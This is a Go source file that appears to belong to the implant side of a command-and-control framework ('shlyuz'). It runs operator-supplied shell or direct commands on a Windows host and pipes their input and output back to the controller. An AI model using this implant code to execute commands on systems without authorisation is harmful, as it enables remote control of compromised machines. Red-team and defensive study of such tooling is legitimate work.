//go:build windows,implant && (!lp || !teamserver)

package fireinteract

import (
	"errors" // For errors.New
	"io"
	"log"
	"os/exec"
	"shlyuz/pkg/component"
	"strings" 
	"syscall" 
)

// ExecuteCmd sets up an interactive session with a command on Windows.
// It uses standard OS pipes for stdin, stdout, and stderr, managed by os/exec.
// Input is read from inPipe, output (stdout & stderr merged) is written to outPipeWriter.
func ExecuteCmd(cmdDetails component.Command, execChannels *component.ComponentExecutionChannel, inPipe io.Reader, outPipeWriter io.Writer) error {
	log.Printf("CmdID %s (Windows): Setting up interactive command: %s, Type: %s", cmdDetails.Id, cmdDetails.Args, cmdDetails.Type)

	var command *exec.Cmd
	var displayCmdLine string

	if cmdDetails.Type == "Shell" {
		command = exec.Command("cmd") 
		displayCmdLine = "cmd /C " + cmdDetails.Args
		command.SysProcAttr = &syscall.SysProcAttr{
			CmdLine: displayCmdLine,
			// HideWindow: true, 
		}
		log.Printf("CmdID %s (Windows): Using Shell execution for interactive session. CmdLine: %s", cmdDetails.Id, displayCmdLine)
	} else { 
		parts := strings.Split(cmdDetails.Args, " ")
		if len(parts) == 0 || parts[0] == "" { // Check if parts[0] is also empty
			errMsg := "Args string is empty or invalid for direct interactive execution."
			log.Printf("CmdID %s (Windows): Error: %s", cmdDetails.Id, errMsg)
			if execChannels != nil && execChannels.StdErr != nil {
				select {
				case execChannels.StdErr <- "Error: " + errMsg: // Send prefixed error
				default: log.Printf("CmdID %s (Windows): StdErr channel full.", cmdDetails.Id)
				}
			}
			return errors.New(errMsg)
		}
		executable := parts[0]
		var args []string
		if len(parts) > 1 {
			args = parts[1:]
		}
		command = exec.Command(executable, args...)
		displayCmdLine = cmdDetails.Args 
		log.Printf("CmdID %s (Windows): Using Direct execution for interactive session. Command: %s, Args: %v", cmdDetails.Id, executable, args)
	}

	if inPipe != nil {
		command.Stdin = inPipe
		log.Printf("CmdID %s (Windows): Stdin connected. CmdLine for logs: %s", cmdDetails.Id, displayCmdLine)
	} else {
		log.Printf("CmdID %s (Windows): No inPipe provided for stdin. CmdLine for logs: %s", cmdDetails.Id, displayCmdLine)
	}

	if outPipeWriter != nil {
		command.Stdout = outPipeWriter
		command.Stderr = outPipeWriter 
		log.Printf("CmdID %s (Windows): Stdout/Stderr connected. CmdLine for logs: %s", cmdDetails.Id, displayCmdLine)
	} else {
		log.Printf("CmdID %s (Windows): No outPipeWriter provided for stdout/stderr. CmdLine for logs: %s", cmdDetails.Id, displayCmdLine)
	}

	if err := command.Start(); err != nil {
		errMsg := "Error starting interactive command"
		log.Printf("CmdID %s (Windows): %s. CmdLine for logs: '%s', Error: %v", cmdDetails.Id, errMsg, displayCmdLine, err)
		if execChannels != nil && execChannels.StdErr != nil {
			select {
			case execChannels.StdErr <- errMsg + ": " + err.Error():
			default: log.Printf("CmdID %s (Windows): StdErr channel full.", cmdDetails.Id)
			}
		}
		return err
	}

	log.Printf("CmdID %s (Windows): Interactive command started successfully (PID: %d). CmdLine for logs: %s", cmdDetails.Id, command.Process.Pid, displayCmdLine)

	if execChannels != nil && execChannels.Pid != nil {
		select {
		case execChannels.Pid <- command.Process.Pid:
		default: log.Printf("CmdID %s (Windows): Pid channel full, dropping PID.", cmdDetails.Id)
		}
	}

	go func() {
		waitErr := command.Wait()
		if waitErr != nil {
			log.Printf("CmdID %s (Windows): Interactive command finished with error: %v. CmdLine for logs: %s", cmdDetails.Id, waitErr, displayCmdLine)
			if execChannels != nil && execChannels.StdErr != nil {
				select {
				case execChannels.StdErr <- waitErr.Error():
				default: log.Printf("CmdID %s (Windows): StdErr channel full.", cmdDetails.Id)
				}
			}
		} else {
			log.Printf("CmdID %s (Windows): Interactive command finished successfully. CmdLine for logs: %s", cmdDetails.Id, displayCmdLine)
		}

		if outPipeWriter != nil {
			if closer, ok := outPipeWriter.(io.Closer); ok {
				log.Printf("CmdID %s (Windows): Closing outPipeWriter. CmdLine for logs: %s", cmdDetails.Id, displayCmdLine)
				if errClose := closer.Close(); errClose != nil {
					log.Printf("CmdID %s (Windows): Error closing outPipeWriter: %v. CmdLine for logs: %s", cmdDetails.Id, errClose, displayCmdLine)
					// Optional: send errClose to execChannels.StdErr
				}
			}
		}
	}()

	return nil 
}
